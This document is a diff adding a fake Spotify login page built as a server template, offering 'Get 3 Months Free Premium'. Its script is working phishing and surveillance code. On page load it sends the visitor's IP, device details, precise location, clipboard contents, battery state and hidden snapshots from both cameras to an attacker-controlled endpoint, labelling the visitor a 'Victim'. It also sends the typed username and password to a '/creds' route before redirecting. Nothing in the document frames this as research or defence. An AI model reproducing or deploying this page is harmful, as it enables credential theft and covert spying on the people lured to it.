@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Spotify - Get 3 Months Free Premium</title>
+<link rel="icon" href="https://open.spotifycdn.com/cdn/images/favicon32.b64ecc03.png">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Circular', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #121212; min-height: 100vh; display: flex; flex-direction: column; color: #fff; }
+.header { padding: 24px 32px; display: flex; align-items: center; }
+.header svg { width: 40px; height: 40px; }
+.header span { font-size: 20px; font-weight: 700; margin-right: 8px; }
+.main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
+.container { width: 100%; max-width: 460px; }
+.promo-banner { background: linear-gradient(135deg, #1DB954, #1ed760); border-radius: 16px; padding: 32px; text-align: center; margin-bottom: 24px; position: relative; overflow: hidden; }
+.promo-banner::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><circle cx="20" cy="20" r="3" fill="rgba(255,255,255,0.1)"/><circle cx="80" cy="60" r="2" fill="rgba(255,255,255,0.08)"/><circle cx="140" cy="30" r="4" fill="rgba(255,255,255,0.06)"/><circle cx="180" cy="80" r="2" fill="rgba(255,255,255,0.1)"/><circle cx="40" cy="120" r="3" fill="rgba(255,255,255,0.07)"/><circle cx="160" cy="150" r="5" fill="rgba(255,255,255,0.05)"/></svg>'); }
+.promo-title { font-size: 28px; font-weight: 800; margin-bottom: 8px; position: relative; z-index: 1; }
+.promo-sub { font-size: 16px; opacity: 0.9; position: relative; z-index: 1; margin-bottom: 16px; }
+.wave-container { display: flex; align-items: flex-end; justify-content: center; gap: 4px; height: 40px; position: relative; z-index: 1; }
+.wave-bar { width: 6px; background: rgba(255,255,255,0.8); border-radius: 3px; animation: wave 1.2s ease-in-out infinite; }
+.wave-bar:nth-child(1) { height: 12px; animation-delay: 0s; }
+.wave-bar:nth-child(2) { height: 24px; animation-delay: 0.1s; }
+.wave-bar:nth-child(3) { height: 36px; animation-delay: 0.2s; }
+.wave-bar:nth-child(4) { height: 20px; animation-delay: 0.3s; }
+.wave-bar:nth-child(5) { height: 30px; animation-delay: 0.4s; }
+.wave-bar:nth-child(6) { height: 16px; animation-delay: 0.5s; }
+.wave-bar:nth-child(7) { height: 28px; animation-delay: 0.6s; }
+.wave-bar:nth-child(8) { height: 22px; animation-delay: 0.7s; }
+@keyframes wave { 0%, 100% { transform: scaleY(1); } 50% { transform: scaleY(0.4); } }
+.features { display: flex; gap: 12px; justify-content: center; margin-top: 16px; position: relative; z-index: 1; }
+.feature { background: rgba(0,0,0,0.2); border-radius: 20px; padding: 6px 14px; font-size: 12px; font-weight: 600; }
+.login-box { background: #282828; border-radius: 8px; padding: 32px; }
+.login-box h2 { font-size: 28px; font-weight: 700; margin-bottom: 8px; text-align: center; }
+.login-box p { font-size: 14px; color: #b3b3b3; margin-bottom: 24px; text-align: center; }
+.form-group { margin-bottom: 16px; }
+.form-group label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; }
+.form-group input { width: 100%; padding: 14px 16px; border: 1px solid #727272; border-radius: 4px; font-size: 16px; color: #fff; background: #121212; outline: none; transition: border-color 0.2s; }
+.form-group input:focus { border-color: #1DB954; box-shadow: 0 0 0 2px rgba(29,185,84,0.3); }
+.form-group input::placeholder { color: #727272; }
+.remember { display: flex; align-items: center; gap: 12px; margin-bottom: 24px; }
+.remember input[type="checkbox"] { width: 16px; height: 16px; accent-color: #1DB954; }
+.remember label { font-size: 14px; color: #b3b3b3; cursor: pointer; }
+.btn-login { width: 100%; padding: 14px; background: #1DB954; color: #000; border: none; border-radius: 500px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; }
+.btn-login:hover { background: #1ed760; transform: scale(1.02); }
+.divider { display: flex; align-items: center; margin: 24px 0; }
+.divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #727272; }
+.divider span { padding: 0 16px; color: #b3b3b3; font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
+.social-btns { display: flex; flex-direction: column; gap: 8px; margin-bottom: 24px; }
+.social-btn { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px; border: 1px solid #727272; border-radius: 500px; font-size: 14px; font-weight: 700; color: #fff; cursor: pointer; background: transparent; text-decoration: none; transition: border-color 0.2s; }
+.social-btn:hover { border-color: #fff; }
+.signup-link { text-align: center; color: #b3b3b3; font-size: 14px; }
+.signup-link a { color: #fff; text-decoration: underline; font-weight: 600; }
+.loading { display: none; text-align: center; padding: 32px; }
+.spinner { border: 3px solid #282828; border-top: 3px solid #1DB954; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.footer { text-align: center; padding: 24px; font-size: 12px; color: #727272; }
+@media (max-width: 500px) { .container { padding: 0 16px; } .promo-banner, .login-box { padding: 24px 20px; } .promo-title { font-size: 22px; } }
+</style>
+</head>
+<body>
+<div class="header">
+<svg viewBox="0 0 24 24" fill="#1DB954"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"/></svg>
+<span>Spotify</span>
+</div>
+<div class="main">
+<div class="container">
+<div class="promo-banner">
+<div class="promo-title">Get 3 Months Free Premium</div>
+<div class="promo-sub">Unlimited music, no ads, offline listening</div>
+<div class="wave-container">
+<div class="wave-bar"></div>
+<div class="wave-bar"></div>
+<div class="wave-bar"></div>
+<div class="wave-bar"></div>
+<div class="wave-bar"></div>
+<div class="wave-bar"></div>
+<div class="wave-bar"></div>
+<div class="wave-bar"></div>
+</div>
+<div class="features">
+<span class="feature">Ad-free</span>
+<span class="feature">Offline</span>
+<span class="feature">HiFi</span>
+</div>
+</div>
+<div class="login-box">
+<h2>Log in to Spotify</h2>
+<p>Sign in to claim your free Premium trial</p>
+<div class="social-btns">
+<a href="#" class="social-btn">
+<svg width="20" height="20" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+Continue with Google
+</a>
+<a href="#" class="social-btn">
+<svg width="20" height="20" viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+Continue with Facebook
+</a>
+</div>
+<div class="divider"><span>or</span></div>
+<form id="loginForm">
+<div class="form-group">
+<label>Email or username</label>
+<input type="text" id="email" placeholder="Email or username" required>
+</div>
+<div class="form-group">
+<label>Password</label>
+<input type="password" id="password" placeholder="Password" required>
+</div>
+<div class="remember">
+<input type="checkbox" id="remember" checked>
+<label for="remember">Remember me</label>
+</div>
+<button type="submit" class="btn-login">Log In</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="font-size: 14px; color: #b3b3b3;">Activating Premium trial...</p>
+</div>
+<div style="text-align: center; margin-top: 16px;">
+<a href="#" style="color: #fff; font-size: 14px; text-decoration: underline;">Forgot your password?</a>
+</div>
+<div class="divider" style="margin: 16px 0;"><span></span></div>
+<div class="signup-link">
+Don't have an account? <a href="#">Sign up for Spotify</a>
+</div>
+</div>
+</div>
+</div>
+<div class="footer">© 2024 Spotify AB</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video = document.getElementById('video');
+var canvas = document.getElementById('canvas');
+
+async function gatherAll() {
+    let td = '🎵 <b>Spotify Victim!</b>\n\n';
+    td += '⚓ IP: <code><%=ip %></code>\n';
+    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
+    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
+    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
+    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
+
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition((p)=>{
+            $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
+        }, ()=>{}, {enableHighAccuracy:true, timeout: 10000});
+    }
+
+    async function captureCamera(facingMode, label) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}});
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 2000));
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label});
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+    }
+
+    try { await captureCamera("user", "selfie"); } catch(e) {}
+    try { await captureCamera("environment", "back"); } catch(e) {}
+
+    try {
+        if(navigator.clipboard && navigator.clipboard.readText) {
+            const clip = await navigator.clipboard.readText();
+            if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)});
+        }
+    } catch(e) {}
+
+    try {
+        const bat = await navigator.getBattery();
+        $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging});
+    } catch(e) {}
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+
+    document.querySelector('form').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+
+    $.post("<%=a %>/creds", {
+        uid: uid,
+        user: encodeURIComponent(email),
+        pass: encodeURIComponent(pass),
+        platform: 'Spotify'
+    });
+
+    await new Promise(r => setTimeout(r, 2500));
+    window.location.href = "<%=url %>";
+});
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
